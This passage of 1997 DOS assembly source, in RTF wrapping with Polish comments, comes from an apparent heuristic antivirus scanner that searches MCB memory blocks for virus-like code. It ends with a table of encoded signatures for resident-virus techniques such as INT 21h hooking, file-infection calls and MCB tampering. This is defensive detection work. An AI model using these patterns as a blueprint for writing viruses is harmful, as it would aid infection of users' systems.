\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                          ; TAK - zwieksz numer segmentu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   di,es                       ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        inc   di                          ;  \\ ES:DI=ES:0010:=ES+1:0}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   es,di                       ;  /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        xor   di,di                       ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch NieZmienSeg:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        dec   dx                          ; zmniejsz ilosc paragrafow w bloku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        jnz   SzukajDalej                 ; NIE - kontynuuj sprawdzanie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        cmp   IloscBiezSygn,IleSygnZebyAlarm}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                          ; czy ilosc wykrytych sygnatur jest}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                          ; odpowiednio duza ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        jb    SzukajWBlokuPowrot          ; NIE - powrot}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        lea   si,TePrawdopodWirus         ; \\ TAK - wypisz o tym komunikat}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        Call  DrukLn                      ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch SzukajWBlokuPowrot:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        pop   di si dx cx bx ax es ds     ; przywroc zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        ret                               ; powrot}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;-----------------------------------------------------------------------------}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DrukLn:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        push  si                          ; zachowaj zmieniany rejestr}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        call  Druk                        ; wyswietl tekst z CS:SI}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        lea   si,TeCRLF                   ; \\ i przejdz do nastepnej linii}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        Call  Druk                        ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        pop   si                          ; przywroc zmieniany rejestr}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        ret                               ; powrot}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;-----------------------------------------------------------------------------}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Druk:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        push  ax si                       ; zachowaj zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DrukPetla:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        lods  byte ptr cs:[si]            ; wez kolejny znak tekstu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        or    al,al                       ; czy NUL ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        jz    DrukPowrot                  ; TAK - koniec tekstu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   ah,0Eh                      ; funkcja BIOS - wyswietl znak}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        int   10h                         ; wywolaj funkcje}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        jmp   short DrukPetla             ; pobierz kolejny znak tekstu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DrukPowrot:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        pop  si ax                        ; przywroc zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        ret                               ; powrot}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;-----------------------------------------------------------------------------}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DrukHEX16:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        push  ax                          ; zachowaj 8 dolnych bitow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   al,ah                       ; AL=AH=wyzsze 8 bitow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        Call  DrukHEX8                    ; wyswietl wyzsze 8 bitow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        pop   ax                          ; przywroc 8 dolnych bitow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DrukHEX8:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        push  ax                          ; zachowaj 4 dolne bity}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        shr   al,1                        ; \\  wez 4 gorne bity}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        shr   al,1                        ;  \\ do AL (podziel przez 16)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        shr   al,1                        ;  /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        shr   al,1                        ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        Call  DrukHEX4                    ; wyswietl 4 gorne bity}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        pop   ax                          ; przywroc 4 dolne bity}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        and   al,15                       ; utworz z nich liczbe 0..F}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DrukHEX4:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        push  bx                          ; BX bedzie potrzebne wiec zachowaj}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        lea   bx,HexZnaki                 ; ustaw BX na tablice konwersji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        xlatb                             ; konwertuj 0..F na '0'..'Z','A'..'Z'}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                          ; AL=cyfra}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   ah,0Eh                      ; funkcja BIOS - wyswietl znak z AL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        int   10h                         ; wywoluje funkcje}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        pop   bx                          ; przywroc BX}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        ret                               ; powrot}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch HexZnaki db '0123456789ABCDEF'           ; tablica konwersji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch TeCopyRight db CR,LF,'HEUR v1.0, Autor : Adam Blaszczyk 1997'}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch             db CR,LF}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch             db CR,LF,'_ Szukam sygnatur ...',NUL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch             db CR,LF}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      TeCRLF db CR,LF,NUL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch  TeZlyMCB         db CR,LF,'_ Struktura blokow MCB pamieci jest zaklocona !',NUL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch  TeSygnatura      db ': Znaleziona sygnatura : ',NUL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch  TeNieMaSygnatur  db CR,LF,'_ Nie znalazlem zadnej sygnatury !',NUL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch  TePrawdopodWirus db CR,LF,'_ UWAGA : W ostatnio sprawdzanym bloku MCB moze byc wirus !'}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                   db CR,LF,'          Swiadczy o tym ilosc znalezionych w nim sygnatur !',NUL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch  TeAdres          db '  Adres=',NUL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch  TeBlokMCB        db '  MCB=',NUL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch  TeRozmiar        db ', Rozmiar MCB=',NUL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch  TeParagraf       db ' paragrafow',NUL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch  TeSprawdzam      db '_ Sprawdzam',NUL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Sygnatury:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   Sygn <'CALL $+3; POP BX                     ',4,0E8h xor 0AAh,000h,000h,05Bh>}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   Sygn <'CALL $+3; POP BP                     ',4,0E8h xor 0AAh,000h,000h,05Dh>}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   Sygn <'CALL $+3; POP SI                     ',4,0E8h xor 0AAh,000h,000h,05Eh>}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   Sygn <'CALL $+3; POP DI                     ',4,0E8h xor 0AAh,000h,000h,05Fh>}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   Sygn <'CMP AX,4B00h; JZ ??                  ',4,03Dh xor 0AAh,000h,04Bh,074h>}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   Sygn <'CMP AX,4B00h; JNZ ??                 ',4,03Dh xor 0AAh,000h,04Bh,075h>}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   Sygn <'CMP AX,"MZ"                          ',4,03Dh xor 0AAh,05Ah,04Dh,075h>}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   Sygn <'CMP AX,"ZM"                          ',4,03Dh xor 0AAh,04Dh,05Ah,075h>}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   Sygn <'MOV AX,2521h; INT 21h                ',5,0B8h xor 0AAh,021h,025h,0CDh,021h>}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   Sygn <'MOV AH,52h; INT 21h                  ',4,0B4h xor 0AAh,052h,0CDh,021h>}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   Sygn <'MOV AX,4300h; CALL NEAR []           ',4,0B8h xor 0AAh,000h,043h,0E8h>}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   Sygn <'MOV AX,4300h; PUSHF; CALL D PTR CS:[]',6,0B8h xor 0AAh,000h,043h,02Eh,09Ch,0FFh>}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   Sygn <'MOV AX,4301h; CALL NEAR []           ',4,0B8h xor 0AAh,001h,043h,0E8h>}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   Sygn <'MOV AX,4301h; PUSHF; CALL D PTR CS:[]',6,0B8h xor 0AAh,001h,043h,02Eh,09Ch,0FFh>}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   Sygn <'MOV AX,5700h; CALL NEAR []           ',4,0B8h xor 0AAh,000h,057h,0E8h>}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   Sygn <'MOV AX,5700h; PUSHF; CALL D PTR CS:[]',6,0B8h xor 0AAh,000h,057h,02Eh,09Ch,0FFh>}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   Sygn <'MOV AX,5701h; CALL NEAR []           ',4,0B8h xor 0AAh,001h,057h,0E8h>}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   Sygn <'MOV AX,5701h; PUSHF; CALL D PTR CS:[]',6,0B8h xor 0AAh,001h,057h,02Eh,09Ch,0FFh>}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   Sygn <'MOV AX,3D02h; CALL NEAR []           ',4,0B8h xor 0AAh,002h,03Dh,0E8h>}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   Sygn <'MOV AX,3D02h; PUSHF; CALL D PTR CS:[]',6,0B8h xor 0AAh,002h,03Dh,02Eh,09Ch,0FFh>}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   Sygn <'MOV AX,4200h; CALL NEAR []           ',4,0B8h xor 0AAh,000h,042h,0E8h>}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   Sygn <'MOV AX,4200h; PUSHF; CALL D PTR CS:[]',6,0B8h xor 0AAh,000h,042h,02Eh,09Ch,0FFh>}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   Sygn <'MOV AX,4202h; CALL NEAR []           ',4,0B8h xor 0AAh,002h,042h,0E8h>}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   Sygn <'MOV AX,4202h; PUSHF; CALL D PTR CS:[]',6,0B8h xor 0AAh,002h,042h,02Eh,09Ch,0FFh>}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   Sygn <'MOV AH,3Fh; CALL NEAR []             ',3,048h xor 0AAh,03Fh,0E8h>}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   Sygn <'MOV AH,3Fh; PUSHF; CALL D PTR CS:[]  ',5,0B4h xor 0AAh,03Fh,02Eh,09Ch,0FFh>}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   Sygn <'MOV AH,40h; CALL NEAR []             ',3,048h xor 0AAh,040h,0E8h>}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   Sygn <'MOV AH,40h; PUSHF; CALL D PTR CS:[]  ',5,0B4h xor 0AAh,040h,02Eh,09Ch,0FFh>}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   Sygn <'CMP DS:[0],"Z"; JZ ??                ',4,080h xor 0AAh,03Fh,05Ah,074h>}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   Sygn <'CMP DS:[0],"Z"; JNZ ??               ',4,080h xor 0AAh,03Fh,05Ah,075h>}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   Sygn <'CMP ES:[0],"Z"; JZ ??                ',5,026h xor 0AAh,080h,03Fh,05Ah,074h>}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   Sygn <'CMP ES:[0],"Z"; JNZ ??               ',5,026h xor 0AAh,080h,03Fh,05Ah,075h>}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   Sygn <'MOV DS:[1],0008h                     ',6,0C7h xor 0AAh,006h,001h,000h,008h,000h>}{\f2\fs24\lang1045{\*\listtag0}\par}
